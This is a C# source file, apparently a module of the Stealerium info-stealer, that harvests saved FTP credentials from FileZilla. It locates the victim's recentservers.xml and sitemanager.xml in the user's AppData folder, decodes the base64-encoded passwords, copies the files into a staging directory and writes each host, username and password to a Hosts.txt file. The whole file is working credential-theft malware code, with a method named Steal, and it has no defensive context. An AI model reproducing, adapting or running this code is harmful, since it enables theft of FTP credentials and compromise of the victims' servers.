using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target;

internal sealed class FileZilla
{
	private static string[] GetPswPath()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
		return new string[2]
		{
			text + "recentservers.xml",
			text + "sitemanager.xml"
		};
	}

	private static List<Password> Steal(string sSavePath)
	{
		List<Password> list = new List<Password>();
		string[] pswPath = GetPswPath();
		if (!File.Exists(pswPath[0]) && !File.Exists(pswPath[1]))
		{
			return list;
		}
		string[] array = pswPath;
		foreach (string text in array)
		{
			try
			{
				if (!File.Exists(text))
				{
					continue;
				}
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text);
				foreach (XmlNode item2 in xmlDocument.GetElementsByTagName("Server"))
				{
					string text2 = item2?["Pass"]?.InnerText;
					if (text2 != null)
					{
						Password password = default(Password);
						password.Url = "ftp://" + item2["Host"]?.InnerText + ":" + item2["Port"]?.InnerText + "/";
						password.Username = item2["User"]?.InnerText;
						password.Pass = Encoding.UTF8.GetString(Convert.FromBase64String(text2));
						Password item = password;
						Counter.FtpHosts++;
						list.Add(item);
					}
				}
				File.Copy(text, Path.Combine(sSavePath, new FileInfo(text).Name));
			}
			catch (Exception ex)
			{
				Logging.Log("Filezilla >> Failed collect passwords\n" + ex);
			}
		}
		return list;
	}

	private static string FormatPassword(Password pPassword)
	{
		return "Url: " + pPassword.Url + "\nUsername: " + pPassword.Username + "\nPassword: " + pPassword.Pass + "\n\n";
	}

	public static void WritePasswords(string sSavePath)
	{
		Directory.CreateDirectory(sSavePath);
		List<Password> list = Steal(sSavePath);
		if (list.Count != 0)
		{
			foreach (Password item in list)
			{
				File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(item));
			}
			return;
		}
		Directory.Delete(sSavePath);
	}
}
